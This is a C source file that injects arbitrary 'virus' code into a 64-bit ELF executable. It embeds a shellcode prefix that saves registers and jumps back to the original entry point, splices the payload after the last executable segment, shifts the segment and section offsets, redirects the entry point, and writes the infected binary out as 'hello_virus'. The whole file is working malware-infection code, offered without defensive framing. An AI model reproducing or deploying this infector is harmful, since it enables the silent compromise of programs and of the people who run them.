#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <elf.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/stat.h>

#include "debug.h"

#define PAGE_SIZE 0x1000

unsigned char prefix_code[] = "\x57\x56\x52\x51\x41\x50\x41\x51\xe8\x0d"
			"\x00\x00\x00\x41\x59\x41"
			"\x58\x59\x5a\x5e\x5f"
			"\xe9\x00\x00\x00\x00";

struct file_info
{
	int fd;
	void *handle;
	unsigned size;
};

int get_prefix_size()
{
	return sizeof(prefix_code) - 1;
}
int get_shdr_table(void *elf_header, Elf64_Shdr **shdr_table)
{
	Elf64_Ehdr *header = (Elf64_Ehdr *)elf_header;
	if (header->e_shnum == 0)
		return 0;

	*shdr_table = (Elf64_Shdr *)((unsigned char *)header
						+ header->e_shoff);
	return header->e_shnum;
}

int get_phdr_table(void *elf_header, Elf64_Phdr **phdr_table)
{
	Elf64_Ehdr *header = (Elf64_Ehdr *)elf_header;
	if (header->e_phnum == 0)
		return 0;

	*phdr_table = (Elf64_Phdr *)((unsigned char *)header
						+ header->e_phoff);
	return header->e_phnum;
}


void read_entry(void *elf_header, unsigned long *entry)
{
	*entry = ((Elf64_Ehdr *)elf_header)->e_entry;
}

void write_entry(void *elf_header, unsigned long *entry)
{
	((Elf64_Ehdr *)elf_header)->e_entry = *entry;
}
int get_file_size(const char *file_path)
{
	struct stat st;
	if (stat(file_path, &st) != 0) {
		perror("stat");
		return 0;
	}
	return st.st_size;
}

int get_file_info(const char *path, struct file_info *fi)
{
	int fd;
	unsigned file_size;
	void *handle;

	if (path == NULL || fi == NULL)
		return -1;

	file_size = get_file_size(path);
	if (file_size == 0)
		return -1;
	debug("file %s size is %d\n", path, file_size);
	fd = open(path, O_RDONLY);
	if (fd < 0) {
		perror("open");
		return -1;
	}

	handle = mmap(NULL, file_size, PROT_READ, MAP_PRIVATE, fd, 0);
	if (handle == MAP_FAILED) {
		perror("mmap");
		close(fd);
		return -1;
	}

	fi->fd = fd;
	fi->size = file_size;
	fi->handle = handle;
	return 0;
}

void free_file(struct file_info *fi)
{
	if (fi == NULL)
		return;
	if (fi->handle)
		munmap(fi->handle, fi->size);
	close(fi->fd);
	return;
}

Elf64_Phdr *get_last_exec_segment(void *elf)
{
	int i;
	int phdr_size;
	Elf64_Phdr *phdr_table;

	int last_seg_index = -1;
	unsigned long max_vaddr = 0;

	phdr_size = get_phdr_table(elf, &phdr_table);
	if (phdr_size == 0)
		return NULL;

	for ( i = 0; i < phdr_size; i++) {
		Elf64_Phdr tmp = phdr_table[i];
		if (tmp.p_type != PT_LOAD)
			continue;
		if ((tmp.p_flags & PF_X) == 0)
			continue;
		if (tmp.p_vaddr > max_vaddr)
			last_seg_index = i;
		debug("p_vaddr is %lx\n", tmp.p_vaddr);
	}

	if (last_seg_index == -1)
		return NULL;
	return &phdr_table[last_seg_index];
}

unsigned get_align_num(unsigned old_size, unsigned add_size, unsigned align)
{
	unsigned remainder = old_size % align;
	return (remainder + add_size) / align;
}

void adjust_seg_after_target(void *elf,// unsigned vaddr_end,
					//unsigned mem_offset,
					unsigned phoff_base,
					unsigned file_offset)
{
	int i;
	int phdr_size;
	Elf64_Phdr *phdr_table;

	phdr_size = get_phdr_table(elf, &phdr_table);
	if (phdr_size == 0)
		return;

	for ( i = 0; i < phdr_size; i++) {
		Elf64_Phdr *tmp = &phdr_table[i];
		// if (tmp->p_vaddr > vaddr_end)
			// tmp->p_vaddr += mem_offset;

		if (tmp->p_offset >= phoff_base)
			tmp->p_offset += file_offset;
		debug("p_vaddr is %lx\n", tmp->p_vaddr);
	}
}


void adjust_sec_after_target(void *elf, unsigned phoff_end,
					unsigned file_offset)
{
	int i;
	int shdr_size;
	Elf64_Shdr *shdr_table;

	shdr_size = get_shdr_table(elf, &shdr_table);
	if (shdr_size == 0)
		return;

	for ( i = 0; i < shdr_size; i++) {
		Elf64_Shdr *tmp = &shdr_table[i];
		if (tmp->sh_offset >= phoff_end)
			tmp->sh_offset += file_offset;
	}

}

int insert_virus(void *new_elf, unsigned elf_size,
			void *virus, unsigned virus_size,
			unsigned insert_loc, unsigned file_offset)
{
	unsigned remainder = elf_size - insert_loc;
	void *tmp = calloc(1, remainder);
	if (tmp == NULL)
		return -1;
	memcpy(tmp, (unsigned char *)new_elf + insert_loc, remainder);
	memcpy((unsigned char *)new_elf + insert_loc + file_offset, tmp, remainder);
	memcpy((unsigned char *)new_elf + insert_loc, virus, virus_size);
	return 0;
}

int write_file(void *handle, unsigned size)
{
	int fd;

	fd = open("hello_virus", O_RDWR | O_CREAT | O_TRUNC);
	if (fd < 0)
		return -1;
	if (write(fd, handle, size) < size)
		return -1;
	close(fd);
	return 0;
}

void *add_virus_prefix(void *virus, unsigned size)
{
	void *new_virus;
	unsigned prefix_code_size;

	prefix_code_size = get_prefix_size();
	new_virus = calloc(1, size + prefix_code_size);
	if (new_virus == NULL)
		return NULL;

	memcpy(new_virus, prefix_code, prefix_code_size);
	memcpy((unsigned char *)new_virus + prefix_code_size,
			virus, size);
	return new_virus;

}


void adjust_jmp_offset(unsigned long old_entry, void *new_virus,
						unsigned long new_entry)
{
	unsigned prefix_code_size;
	int jmp_offset;

	prefix_code_size = get_prefix_size();
	jmp_offset = old_entry - (new_entry + prefix_code_size);

	*(int *)((unsigned char*)new_virus + prefix_code_size - 4) = jmp_offset;
}

int generate_virus_elf(void *victim, int elf_size, void *virus, int virus_size)
{
	// unsigned align_num;
	unsigned file_offset;
	// unsigned new_vaddr;
	unsigned insert_loc;

	void *new_elf;
	void *prefix_virus;
	unsigned long old_entry;
	unsigned long new_entry;
	Elf64_Phdr *target_seg;

	prefix_virus = add_virus_prefix(virus, virus_size);
	if (prefix_virus == NULL) {
		perror("calloc failed");
		return -1;
	}
	virus_size += get_prefix_size();

	file_offset = (virus_size / PAGE_SIZE + 1) * PAGE_SIZE;
	if (file_offset > PAGE_SIZE) {
		printf("virus size is unsupported. bigger than %x\n", PAGE_SIZE);
		return -1;
	}

	new_elf = calloc(1, elf_size + file_offset);

	if (new_elf == NULL) {
		perror("calloc failed");
		return -1;
	}

	memcpy(new_elf, victim, elf_size);

	target_seg = get_last_exec_segment(new_elf);
	if (target_seg == NULL)
		return -1;

	read_entry(victim, &old_entry);
	new_entry = target_seg->p_vaddr + target_seg->p_memsz;
	adjust_jmp_offset(old_entry, prefix_virus, new_entry);
	write_entry(new_elf, &new_entry);

	// if we need to relocate the vaddr of every segment
	// align_num = get_align_num(target_seg->p_memsz,
				// file_offset, target_seg->p_align);

	// if (align_num > 0) {
		// new_vaddr = target_seg->p_vaddr
				// + (align_num + 1) * target_seg->p_align;
		// adjust_seg_after_target(new_elf, new_vaddr,
						// target_seg->p_align
						// * align_num,
						// target_seg->p_offset,
						// virus_size);
	// }

	insert_loc = target_seg->p_offset + target_seg->p_filesz;
	adjust_seg_after_target(new_elf, insert_loc, file_offset);
	adjust_sec_after_target(new_elf, insert_loc, file_offset);

	Elf64_Ehdr *tmp_header = (Elf64_Ehdr *)new_elf;
	debug("insert_loc = %x, seg_off = %lx\n", insert_loc, target_seg->p_offset);
	if (insert_loc < tmp_header->e_phoff)
		tmp_header->e_phoff += file_offset;

	if (insert_loc < tmp_header->e_shoff)
		tmp_header->e_shoff += file_offset;

	target_seg->p_memsz += file_offset;
	target_seg->p_filesz += file_offset;

	insert_virus(new_elf, elf_size, prefix_virus, virus_size,
					insert_loc, file_offset);
	debug("file size should be %x", elf_size + file_offset);
	if (write_file(new_elf, elf_size + file_offset) != 0)
		return -1;
	free(new_elf);
	free(prefix_virus);
	return 0;
}

int main(int argc, char **argv)
{
	struct file_info victim;
	struct file_info virus;

	if (argc != 3) {
		printf("Please input the elf of victim, and virus code");
	}
	if (get_file_info(argv[1], &victim))
		return -1;
	if (get_file_info(argv[2], &virus))
		return -1;

	generate_virus_elf(victim.handle, victim.size,
					virus.handle, virus.size);

	free_file(&victim);
	free_file(&virus);
	return 0;
}
